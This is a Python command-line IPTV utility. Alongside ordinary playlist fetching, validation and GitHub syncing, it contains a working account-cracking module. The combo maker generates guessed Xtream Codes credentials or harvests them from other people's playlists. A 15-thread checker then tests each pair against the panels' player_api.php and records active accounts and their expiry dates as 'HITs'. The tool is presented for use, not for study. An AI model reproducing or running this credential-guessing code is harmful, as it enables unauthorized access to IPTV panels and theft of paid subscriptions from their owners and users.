import requests
import os
import re
import concurrent.futures
import threading
import subprocess
from datetime import datetime
from rich.console import Console
from rich.panel import Panel

console = Console()

# --- Files ---
OUTPUT_DIR = "output"
ALL_SOURCE_TXT = "allsource.txt"
CRACK_FILE = "crack.txt"
COMBO_FILE = "iptv_combo.txt"

class SM_IPTV_Ultimate:
    def __init__(self):
        self.lock = threading.Lock()
        os.makedirs(OUTPUT_DIR, exist_ok=True)

    def banner(self):
        os.system('clear')
        console.print(Panel.fit("[bold cyan]⚡ SM IPTV SUPREME FINAL FIX ⚡[/bold cyan]\n[white]Validation Mode | Dynamic Category | Auto-Sync[/white]"))

    def check_link_status(self, link):
        """Playable kina check korbe (Status 200/302)"""
        try:
            r = requests.head(link, timeout=5, allow_redirects=True)
            return r.status_code in [200, 302]
        except: return False

    def github_sync(self):
        if os.path.exists(".git"):
            console.print("[dim][*] Syncing GitHub...[/dim]")
            subprocess.run("git add . && git commit -m 'Update' && git push -u origin main", shell=True)

    def parse_and_validate(self, urls_str):
        all_channels = []
        urls = [u.strip() for u in urls_str.split(",") if u.strip()]
        
        for url in urls:
            try:
                console.print(f"[yellow][~] Scanning Link...[/yellow]")
                r = requests.get(url, timeout=15).text
                # Category parsing (group-title or #EXTGRP)
                matches = re.findall(r'#EXTINF:.*?(?:group-title="(.*?)")?.*?,(.*?)\n(?:#EXTGRP:(.*?)\n)?(http.*?)(?:\n|$)', r)
                
                for group1, name, group2, link in matches:
                    category = group1 or group2 or "General"
                    # No Adult
                    if any(x in name.lower() or x in category.lower() for x in ["adult", "sex", "xxx", "porn"]):
                        continue
                        
                    # Validation: Shudu cholbe segulo nibe
                    if self.check_link_status(link.strip()):
                        all_channels.append({"cat": category.strip(), "name": name.strip(), "link": link.strip()})
            except: pass
        return all_channels

    def all_channel_update(self, urls_str):
        channels = self.parse_and_validate(urls_str)
        path = os.path.join(OUTPUT_DIR, "all_channels.m3u")
        with open(path, "w", encoding="utf-8") as f:
            f.write("#EXTM3U\n")
            for ch in channels: f.write(f"#EXTINF:-1,{ch['name']}\n{ch['link']}\n")
        console.print(f"[green]✔ {len(channels)} Valid channels updated.[/green]")
        self.github_sync()

    def custom_category_update(self, urls_str):
        channels = self.parse_and_validate(urls_str)
        cats = sorted(list(set([ch['cat'] for ch in channels])))
        
        console.print("\n[bold cyan]Select Categories to Update (Serial):[/bold cyan]")
        for i, c in enumerate(cats, 1): print(f"{i}. {c}")
        
        choice = input("\nEnter Numbers (e.g. 123): ")
        indices = [int(i)-1 for i in choice if i.isdigit() and 0 < int(i) <= len(cats)]

        for idx in indices:
            c_name = cats[idx]
            f_name = os.path.join(OUTPUT_DIR, f"{c_name.replace(' ','_')}.m3u")
            filtered = [f"#EXTINF:-1,{ch['name']}\n{ch['link']}" for ch in channels if ch['cat'] == c_name]
            with open(f_name, "w", encoding="utf-8") as f:
                f.write("#EXTM3U\n" + "\n".join(filtered))
            console.print(f"[green]✔ {c_name} updated.[/green]")
        self.github_sync()

    def source_copy(self):
        url = input("Enter M3U Link: ")
        try:
            r = requests.get(url).text
            with open("allsource.txt", "w") as f: f.write(r)
            console.print("[green]✔ Saved to allsource.txt[/green]")
        except: print("Error!")

    def crack_worker(self, combo):
        try:
            base = combo.split("/get.php")[0]
            api = f"{base}/player_api.php?{combo.split('?')[1]}"
            res = requests.get(api, timeout=10).json()
            if res.get("user_info", {}).get("status") == "Active":
                info = f"HIT: {combo} | Exp: {res['user_info'].get('exp_date','N/A')}"
                with self.lock:
                    with open(CRACK_FILE, "a") as f: f.write(info + "\n")
                console.print(f"[bold green]{info}[/bold green]")
        except: pass

    def combo_maker_advance(self):
        self.banner()
        print("1. Auto (Pattern) | 2. Custom (Extract)")
        c = input("Choice: ")
        if c == "1":
            link = input("Enter Xtream Host Link: ")
            name = input("Target Name: ")
            host = re.search(r'(http://[^\s/:]+:\d+)', link).group(1)
            with open(COMBO_FILE, "w") as f:
                for i in range(2024, 2027):
                    u = f"{name}{i}"
                    for p in [u, f"{name}123", "123456", "0000"]:
                        f.write(f"{host}/get.php?username={u}&password={p}&type=m3u_plus\n")
            print("✔ Combo Made.")
        elif c == "2":
            path = input("M3U Path/Link: ")
            data = requests.get(path).text if path.startswith("http") else open(path).read()
            matches = re.findall(r'(http://[^\s/:]+:\d+)/get\.php\?username=([^\s&]+)&password=([^\s&]+)', data)
            with open(COMBO_FILE, "w") as f:
                for h, u, p in set(matches): f.write(f"{h}/get.php?username={u}&password={p}&type=m3u_plus\n")
            print(f"✔ {len(matches)} Extracted.")

    def menu(self):
        while True:
            self.banner()
            print("1. All Channel (Valid Only)\n2. Custom Folder (Serial)\n3. Source Copy (allsource.txt)\n4. Source All (Manual Push)\n5. Crack IPTV (Checker)\n6. Combo Maker (Advanced)\n0. Exit")
            opt = input("\n[>] Choice: ")
            if opt == "1": self.all_channel_update(input("Links: "))
            elif opt == "2": self.custom_category_update(input("Links: "))
            elif opt == "3": self.source_copy()
            elif opt == "4": self.github_sync()
            elif opt == "5":
                p = input("Combo Path: ").strip()
                if os.path.exists(p):
                    links = open(p).read().splitlines()
                    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex: ex.map(self.crack_worker, links)
                else: print("File Not Found!")
            elif opt == "6": self.combo_maker_advance()
            elif opt == "0": break
            input("\nEnter...")

if __name__ == "__main__":
    SM_IPTV_Ultimate().menu()
